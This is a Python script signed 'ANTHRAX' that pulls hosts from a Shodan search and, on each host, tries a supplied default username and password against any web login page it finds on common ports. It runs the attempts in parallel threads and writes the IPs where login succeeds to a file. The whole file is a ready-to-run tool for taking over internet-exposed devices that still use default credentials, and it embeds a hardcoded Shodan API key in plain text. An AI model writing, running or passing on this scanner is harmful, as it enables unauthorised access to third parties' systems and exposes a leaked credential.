import shodan
import concurrent.futures
import requests
from requests.exceptions import ConnectTimeout, InvalidURL
api_key = "J76yTatM3TM3Sw7IaFk2cuAUcbHT4PiQ"

print("     .--.     .-. .-.    .---.    .-. .-.   .----.    .-. .-.      .-.  .-.   ")
print("    / {} \    |  `| |   {_   _}   | {_} |   | {}  }   | {_} |       \ \/ /")    
print("   /  /\  \   | |\  |     | |     | { } |   | .-. \   | { } |       / /\ \  ")  
print("   `-'  `-'   `-' `-'     `-'     `-' `-'   `-' `-'   `-' `-'      `-'  `-'   ")
print("SHODAN API AUTHENTICATED SUCCESSFULLY.")
search_query = input("Enter your Shodan search query: ")
login_ports = [80, 8080, 443, 4433]
api = shodan.Shodan(api_key)
print("| __________________________________________ |")
print("| -_- | _ WRITTEN BY ANTHRAX ////\\_ | -_-   |" )
print("| __________________________________________ |")

def login_page_found(username, password, ip):
    try:
        for port in login_ports:
            url = f"http://{ip}:{port}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200 and "login" in response.text.lower():
                auth_url = f"http://{ip}:{port}/login"
                auth_response = requests.get(auth_url, auth=(username, password), timeout=5)
                if auth_response.status_code == 200:
                    return True
        return False
    except (ConnectTimeout, InvalidURL):
        return False
    except requests.exceptions.RequestException:
        return False
try:
    results = api.search(search_query)
    total_results = results["total"]
    print("Total results found:", total_results)
    username = input("Enter default testing username: ")
    password = input("Enter default testing password: ")
    targets_opened = 0   
    successful_ips = []  
    def process_result(result):
        ip = result["ip_str"]
        login_page = login_page_found(username, password, ip)
        if login_page:
            print(f"Authentication successful for IP: {ip}")
            return ip
        else:
            print(f"Authentication failed for IP: {ip}")
            return None
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(process_result, result) for result in results["matches"]]
        concurrent.futures.wait(futures)
        for future in futures:
            ip = future.result()
            if ip:
                targets_opened += 1
                successful_ips.append(ip)
    print(f"{targets_opened} target(s) authenticated successfully!")
    print("Accessible target(s) saved successfully!")
    if targets_opened == 0:
        print("NO LOGIN SUCCESSFUL :( Try different Query!")
    else:
        save_path = "C:\\Documents\\successfullogin.txt"
        with open(save_path, "w") as file:
            for ip in successful_ips:
                file.write(ip + "\n")
except shodan.APIError as e:
    print("Error:", e)
